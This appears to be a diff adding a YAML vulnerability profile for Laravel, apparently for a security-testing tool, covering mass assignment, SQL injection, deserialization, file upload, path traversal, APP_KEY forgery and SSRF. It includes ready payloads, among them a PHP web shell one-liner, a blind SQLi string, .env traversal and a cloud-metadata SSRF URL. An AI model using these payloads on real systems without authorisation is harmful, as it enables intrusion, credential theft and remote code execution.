@@ -1,0 +1,113 @@
+tech_name: Laravel
+
+common_vulns:
+  - vuln_name: Mass Assignment via Eloquent without $guarded/$fillable
+    description: >
+      Eloquent models without $fillable or with $guarded = [] allow all request
+      attributes to be mass-assigned, including role, is_admin, email_verified_at.
+    indicators:
+      - "$guarded = []"
+      - "$fillable absent"
+      - "Model::create(request()->all())"
+    test_idea: >
+      Submit a POST/PUT with is_admin=1 or role=administrator in the request body.
+      Verify if the model persists the privilege escalation.
+
+  - vuln_name: SQL Injection via Raw Expressions
+    description: >
+      DB::select() with string concatenation, ->whereRaw() with user input, or
+      ->orderByRaw() injection points bypass Eloquent's parameterization.
+    indicators:
+      - "DB::select(\"SELECT"
+      - "whereRaw(\"... \" . $request"
+      - "orderByRaw($request"
+    test_idea: >
+      Inject SQL in sort/filter parameters passed to whereRaw/orderByRaw.
+      Try time-based payloads: ' AND SLEEP(5)-- - to confirm blind SQLi.
+
+  - vuln_name: CSRF Token Missing on API Routes
+    description: >
+      Laravel's api middleware group disables CSRF by default via VerifyCsrfToken
+      middleware exclusions. Stateful API endpoints using session auth are vulnerable.
+    indicators:
+      - "VerifyCsrfToken::$except"
+      - "api middleware group"
+      - "session-based auth on API"
+    test_idea: >
+      Identify API endpoints using session cookies rather than tokens.
+      Craft cross-origin form to perform state-changing operations.
+
+  - vuln_name: PHP Object Deserialization via Unserialize
+    description: >
+      PHP's unserialize() with user-controlled input, combined with available
+      gadget chains (Laravel gadgets: __destruct → file write, or POP chains),
+      allows RCE or arbitrary file write.
+    indicators:
+      - "unserialize($request"
+      - "base64_decode + unserialize"
+      - "cookie value deserialized"
+    test_idea: >
+      Use PHPGGC to generate a Laravel gadget chain payload. Base64-encode and
+      supply to the unserialize endpoint. Observe file system effects or RCE.
+
+  - vuln_name: Arbitrary File Upload and RCE
+    description: >
+      File upload handlers without MIME validation or relying only on extension
+      allow PHP file uploads. Combined with a known storage path, this leads to RCE.
+    indicators:
+      - "Storage::put($request->file"
+      - "file->getClientOriginalExtension()"
+      - "storeAs without MIME check"
+    test_idea: >
+      Upload a .php file (or .php5, .phtml) containing <?php system($_GET['cmd']); ?>.
+      Request the uploaded file URL to execute commands.
+
+  - vuln_name: Path Traversal in File Download
+    description: >
+      Response::download() or Storage::get() with user-controlled filenames allow
+      reading arbitrary files from the server's filesystem.
+    indicators:
+      - "Storage::get($request->filename"
+      - "Response::download($path . $request"
+    test_idea: >
+      Request filename=../../.env or ../config/database.php.
+      The .env file contains DB credentials and APP_KEY.
+
+  - vuln_name: APP_KEY Leakage and Cookie Forgery
+    description: >
+      Laravel encrypts session cookies using APP_KEY. If the key is leaked (via
+      .env exposure, debug pages, or VCS history), session cookies can be forged.
+    indicators:
+      - ".env file accessible"
+      - "APP_KEY in response"
+      - "APP_DEBUG=true"
+    test_idea: >
+      Access /.env directly. If APP_KEY is obtained, use Laravel cookie forger
+      tools to create an authenticated session as any user including admin.
+
+  - vuln_name: SSRF via HTTP Client Wrapper
+    description: >
+      Laravel's Http facade (Http::get($url) with user input) without allowlist
+      validation enables SSRF to internal services and cloud metadata endpoints.
+    indicators:
+      - "Http::get($request->url"
+      - "file_get_contents($request"
+      - "curl_exec with user url"
+    test_idea: >
+      Supply url=http://169.254.169.254/latest/meta-data/ or url=http://localhost:6379
+      to endpoints invoking the HTTP facade with user-controlled URLs.
+
+misconfigurations:
+  - APP_DEBUG=true in production
+  - .env file publicly accessible
+  - APP_KEY short or weak
+  - php artisan serve used in production
+  - Log files in public/ directory
+
+payload_hints:
+  mass_assignment: "is_admin=1&role=administrator"
+  sqli_orderby: "column=id&direction=asc' AND SLEEP(5)--"
+  env_access: "/.env"
+  php_upload: "<?php system($_GET['cmd']); ?>"
+  path_traversal: "filename=../../.env"
+  ssrf: "url=http://169.254.169.254/latest/meta-data/"
